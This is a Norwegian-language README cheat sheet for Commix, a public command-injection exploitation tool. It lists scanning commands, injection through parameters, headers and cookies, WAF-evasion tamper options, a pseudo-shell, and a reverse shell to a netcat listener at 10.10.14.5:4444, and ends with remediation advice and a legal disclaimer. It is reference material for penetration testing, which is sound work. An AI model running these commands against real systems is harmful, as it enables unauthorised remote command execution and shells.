<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Nettsikkerhet">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Automatisert verktøy utviklet for å oppdage og utnytte kommandoinjeksjonssårbarheter i nettapplikasjoner og spawn interaktive skall</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt & The Command Injection Primitive](#-overview--the-command-injection-primitive)
- [Installasjon](#-installasjon)
– [Basic Vulnerability Scanning](#-basic-vulnerability-scanning)
- [Injecting Different HTTP Elements](#-injecting-different-http-elements)
  - [GET Parameters](#get-parameters)
  - [POST-data (`--data`)](#post-data---data)
  - [HTTP-hoder og informasjonskapsler](#http-headers--informasjonskapsler)
- [Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
  - [Pseudo-shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [WAF Evasion & Tamper Scripts (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Filbaserte og tidsbaserte blindteknikker](#-filbaserte--tidsbaserte-blindteknikker)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt & The Command Injection Primitive

Mens **SQLMap** automatiserer SQL-injeksjon, er **Commix** (laget av **Anastasios Stasinopoulos**) gullstandarden for å finne og utnytte **OS Command Injection**-feil.

Når nettapplikasjoner på en usikker måte sender brukerinndata direkte til operativsystemets utførelsesfunksjoner (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), kan angripere legge til vilkårlige skallkommandoer. Commix oppdager resultatbaserte, utdatabaserte, tidsbaserte blinde og filbaserte injeksjonsvektorer automatisk.

---

## 📥 Installasjon
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Grunnleggende sårbarhetsskanning
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Injiserer forskjellige HTTP-elementer

### GET parametere
Bruk `INJECT_HERE`-taggen hvis det finnes flere parametere:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### POST-data (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### HTTP-hoder og informasjonskapsler
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Spawning Interactive & Reverse Shells

### Pseudo-shell (`--os-shell`)

Når injeksjonen er bekreftet, gir Commix en emulert pseudoterminal direkte i konsollen:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Native Reverse Shell (`--reverse-ip`)

Instruer Commix om å slippe en fullstendig interaktiv omvendt TCP-tilkobling tilbake til din Netcat-lytter:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 WAF Evasion & Tamper Scripts (`--tamper`)

Omgå brannmurer for nettapplikasjoner (WAF) og strengsvartelister ved hjelp av innebygd uklarhetsmanipulering:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Filbaserte og tidsbaserte blindteknikker

Når utdata ikke gjengis tilbake til HTTP-svaret:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Skann GET-parameter** | `commix -u "<URL>?param=val"` |
| **Skann POST-parameter** | `commix -u "<URL>" --data="param=val"` |
| **Batch ikke-interaktiv skanning** | `commix -u "<URL>" --batch` |
| **Interaktivt terminalskall**| `commix -u "<URL>" --os-shell` |
| **Slipp omvendt skall** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Replay Burp Request** | `commix -r burp_request.req` |
| **Bruk Space Tamper** | `commix -u "<URL>" --tamper=space2ifs` |
| **Utfør enkeltkommando** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Defensive vurderinger og utbedring

1. **Unngå OS Shell Execution:** Aldri slå sammen usanerte brukerinndata til `system()`, `exec()` eller shell-kommandoer.
2. **Bruk Native Language APIer:** Erstatt systemverktøy med native programmeringsspråkbiblioteker (bruk f.eks. Pythons `socket`-bibliotek i stedet for å kjøre systemet `ping` binær).
3. **Streng hvitelisting:** Hvis brukerinndata må diktere programkjøring, valider inndata mot en streng alfanumerisk hviteliste før påkalling.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Commix automatiserer vilkårlig kommandoutførelse på målservere. Fuzzing eller utnyttelse av uautoriserte nettapplikasjoner er ulovlig. Bruk kun på systemer der du har eksplisitt skriftlig autorisasjon.